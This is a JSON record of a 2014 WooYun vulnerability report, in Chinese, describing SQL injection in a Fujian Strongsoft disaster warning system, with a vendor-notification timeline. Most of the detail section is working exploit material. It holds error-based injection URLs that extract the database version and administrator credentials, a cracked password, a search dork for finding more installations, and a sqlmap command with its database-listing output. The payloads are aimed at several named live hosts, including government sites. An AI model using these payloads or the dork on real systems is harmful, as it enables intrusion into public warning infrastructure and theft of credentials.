{"id": 42637, "wybug_id": "wooyun-2014-085076", "wybug_title": "四创灾害预警系统SQL注入漏洞", "wybug_corp": "福建四创", "wybug_author": "路人甲", "wybug_date": "2014-12-02 16:54", "wybug_open_date": "2015-03-02 16:56", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-02：\t细节向公众公开  简要描述： RT 详细说明：  \n官网：http://www.strongsoft.net/谷歌搜索： intitle:预警 系统 技术支持:福建四创\n\n\n\n注入链接：/warn/AjaxHandle/AjaxWarnRule.ashx注入参数：adcd【获取数据库版本】/warn/AjaxHandle/AjaxWarnRule.ashx?adcd=1%27%2b(SELECT+1+WHERE+5726=CONVERT(INT,(select+top+1+@@version+from+strongmain.dbo.Web_SystemUser)))%2b%27【管理员账号密码】/warn/AjaxHandle/AjaxWarnRule.ashx?adcd=1%27%2b(SELECT+1+WHERE+5726=CONVERT(INT,(select+top+1+UserID%2b'|'%2bUserPwd+from+strongmain.dbo.Web_SystemUser)))%2b%27【SQLmap注入】sqlmap  -u http://x.x.x.x/warn/AjaxHandle/AjaxWarnRule.ashx?adcd=1 --level 5 --risk 3  --dbms mssql --batch --dbs -v 3 --random-agent -v 3\n   漏洞证明：  \n测试案例：(1)  http://218.86.6.48:3505【报错注入】http://218.86.6.48:3505/warn/AjaxHandle/AjaxWarnRule.ashx?adcd=1%27%2b(SELECT+1+WHERE+5726=CONVERT(INT,(@@version)))%2b%27\n\n【获取管理员密码】http://218.86.6.48:3505/warn/AjaxHandle/AjaxWarnRule.ashx?adcd=1%27%2b(SELECT+1+WHERE+5726=CONVERT(INT,(select+top+1+UserID%2b'|'%2bUserPwd+from+strongmain.dbo.Web_SystemUser)))%2b%27\n\n\n\nCmd5解密78260db902eb717c7d8ff9254dee2b54为jys0599\n\n\n\n【登录系统】http://218.86.6.48:3505/AdminUserLogin.aspx\n\n\n\n【SQLmap注入】sqlmap  -u http://218.86.6.48:3505/warn/AjaxHandle/AjaxWarnRule.ashx?adcd=1 --level 5 --risk 3  --dbms mssql --batch --dbs -v 3 --random-agent -v 1     ---Place: GETParameter: adcd    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: adcd=1'+(SELECT 'ciDA' WHERE 7444=7444 AND 7152=CONVERT(INT,(SELECT CHAR(113)+CHAR(108)+CHAR(111)+CHAR(117)+CHAR(113)+(SELECT (CASE WHEN (7152=7152) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(99)+CHAR(111)+CHAR(105)+CHAR(113))) )+'---[07:51:32] [INFO] testing Microsoft SQL Server[07:51:32] [INFO] confirming Microsoft SQL Server[07:51:39] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008[07:51:39] [INFO] fetching database names[07:51:39] [INFO] the SQL query used returns 12 entries[07:51:39] [INFO] resumed: cjya[07:51:39] [INFO] resumed: imsh[07:51:39] [INFO] resumed: kvnetdb[07:51:39] [INFO] resumed: master[07:51:42] [INFO] retrieved: model[07:51:42] [INFO] resumed: msdb[07:51:42] [INFO] resumed: ReportServer[07:51:42] [INFO] resumed: ReportServerTempDB[07:51:42] [INFO] resumed: StrongMain[07:51:42] [INFO] resumed: StrongWater[07:51:42] [INFO] resumed: StrongWater_0815[07:51:42] [INFO] resumed: tempdbavailable databases [12]:[*] cjya[*] imsh[*] kvnetdb[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] StrongMain[*] StrongWater[*] StrongWater_0815[*] tempdb\n\n\n\n\n\n其他案例：http://shzh.wlfx.gov.cn/warn/AjaxHandle/AjaxWarnRule.ashx?adcd=1%27%2b(SELECT+1+WHERE+5726=CONVERT(INT,(select+top+1+UserID%2b%27|%27%2bUserPwd+from+strongmain.dbo.Web_SystemUser)))%2b%27http://yj.yywater.gov.cn/warn/AjaxHandle/AjaxWarnRule.ashx?adcd=1%27%2b(SELECT+1+WHERE+5726=CONVERT(INT,(select+top+1+UserID%2b%27|%27%2bUserPwd+from+strongmain.dbo.Web_SystemUser)))%2b%27http://218.86.6.48:3505/warn/AjaxHandle/AjaxWarnRule.ashx?adcd=1%27%2b(SELECT+1+WHERE+5726=CONVERT(INT,(select+top+1+UserID%2b%27|%27%2bUserPwd+from+strongmain.dbo.Web_SystemUser)))%2b%27http://222.78.185.230:3505/warn/AjaxHandle/AjaxWarnRule.ashx?adcd=1%27%2b(SELECT+1+WHERE+5726=CONVERT(INT,(select+top+1+UserID%2b%27|%27%2bUserPwd+from+strongmain.dbo.Web_SystemUser)))%2b%27\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-12-07 15:12 厂商回复： CNVD确认并复现所述情况,已经由CNVD按以往建立的联系渠道向软件生产厂商——福建四创公司通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}